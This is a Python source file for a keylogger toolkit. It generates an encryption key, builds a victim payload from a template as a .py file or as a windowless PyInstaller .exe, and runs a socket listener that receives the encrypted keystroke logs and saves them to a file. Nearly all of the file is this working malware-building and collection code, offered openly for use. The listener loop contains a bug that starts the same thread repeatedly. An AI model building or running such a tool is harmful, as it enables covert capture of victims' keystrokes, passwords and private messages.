import PyInstaller.__main__
import os
import shutil
import argparse
import struct
import socket
import pyfiglet
import random
import threading
from colorama import Fore, init
from threading import *
from cryptography.fernet import Fernet

def encrypt(data): return fernet.encrypt(data)
def decrypt(data): return fernet.decrypt(data)

init(autoreset=True)

parser = argparse.ArgumentParser(description="Create Payload To Windows Or Listen To Payload")

parser.add_argument('-i', '--ip', type=str, help='Connection Address')
parser.add_argument('-p', '--port', type=int, help='Connection Port')
parser.add_argument('-t', '--type', type=str, help='Keylogger Type (py or exe)')
parser.add_argument('-l', '--listen', action='store_true', help='Listen To Keylogger')
parser.add_argument('-g', '--generate', action='store_true', help='Generate Key')
parser.add_argument('-o', '--output', default='output.txt', type=str, help='Log Output (Default: output.txt)')

args = parser.parse_args()

if not args.generate and (not args.ip or not args.port):
    parser.print_usage()
    exit(0)

ip = args.ip
port = args.port

KEY = b''

current_directory = os.getcwd()
payload_folder = "payloads"
payload_name = "keylogger.py"
payload_path = os.path.join(current_directory, payload_folder, payload_name)
settings_folder = "settings"
key_file = "key"
key_path = os.path.join(current_directory, settings_folder, key_file)

if args.generate:
    with open(key_path, 'wb') as key_f:
        KEY = Fernet.generate_key()
        key_f.write(KEY)
        key_f.close()
    print(Fore.LIGHTCYAN_EX + "[+] Completed Generating")
else:
    with open(key_path, 'rb') as key_f:
        KEY = key_f.read()
        key_f.close()

fernet = Fernet(KEY)

def recv_data(conn):
    try:
        size_data = conn.recv(4)
        if not size_data or len(size_data) < 4:
            print(Fore.LIGHTRED_EX + "[-] Session Closed!")
            exit(0)
        size = struct.unpack('>I', size_data)[0]
        data = conn.recv(size)
        if not data or len(data) < size:
            print(Fore.LIGHTRED_EX + "[-] Session Closed!")
            exit(0)
        return decrypt(data)
    except Exception as e:
        print(Fore.LIGHTRED_EX + "[!] Error: {}".format(e))
        exit(0)

def startlog(conn):
    new_text = recv_data(conn)
    print(Fore.LIGHTCYAN_EX + "[+] Log Getted...")
    with open(args.output, 'a+') as file:
        file.write(new_text.decode())
        file.close()
def main():
    print(Fore.LIGHTCYAN_EX + "[+] Starting...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((args.ip, args.port))
    s.listen(1)
    conn, address = s.accept()
    print(Fore.LIGHTCYAN_EX + '[+] Waiting Connection...')
    print(Fore.LIGHTCYAN_EX + '[+] Connected... Session Info : ', Fore.LIGHTGREEN_EX + address[0] + Fore.LIGHTGREEN_EX + ':' + Fore.LIGHTGREEN_EX + str(address[1]))
    thread = threading.Thread(target=startlog, args=(conn,))
    thread.daemon = True
    while True:
        thread.start()
if(args.listen):
    main()
elif args.type:
    with open(payload_path, 'r', encoding='utf-8') as payload:
        try:
            content = payload.read()
            new_content = content

            new_content = new_content.replace("__ipaddr__", ip)
            new_content = new_content.replace("12345", str(port))
            new_content = new_content.replace("'RANDOM_KEY'", str(KEY))
            payload.close()
        except Exception as error:
            print(Fore.LIGHTRED_EX + f"[!] Error: {error}")
    with open("temp.py", 'w', encoding='utf-8') as file:
        if args.type == 'py':
            with open("payload.py", 'w', encoding='utf-8') as py_payload:
                try:
                    py_payload.write(new_content)
                    print(Fore.LIGHTCYAN_EX + "Building Complete!")
                    file.close()
                    os.remove("temp.py")
                    py_payload.close()
                except Exception as error:
                    print(Fore.LIGHTRED_EX + "[!] Error: {error}")
        elif args.type == 'exe':
            try:
                file.write(new_content)
                print(Fore.LIGHTCYAN_EX + "[+] Created Payload...")
                print(Fore.LIGHTCYAN_EX + "[+] Building Payload...")
                options = [
                    'temp.py',
                    '--onefile',
                    '--noconsole']
                payload_dir = os.getcwd() + "\\" + "keylogger.exe"
                file.close()
                PyInstaller.__main__.run(options)

                shutil.copy("dist/temp.exe", "payload.exe")
                shutil.rmtree("build")
                shutil.rmtree("dist")
                os.remove("temp.spec")
                os.remove("temp.py")
                print(Fore.LIGHTCYAN_EX + "[+] Build Complete!")
                print(Fore.LIGHTYELLOW_EX + f"[+] /{payload_dir}")
            except Exception as error:
                print(Fore.LIGHTRED_EX + "[-] Errror: {}".format(error))
        else:
            print(Fore.LIGHTRED_EX + f"[!] Error: Invalid Output Type {args.type}")
        file.close()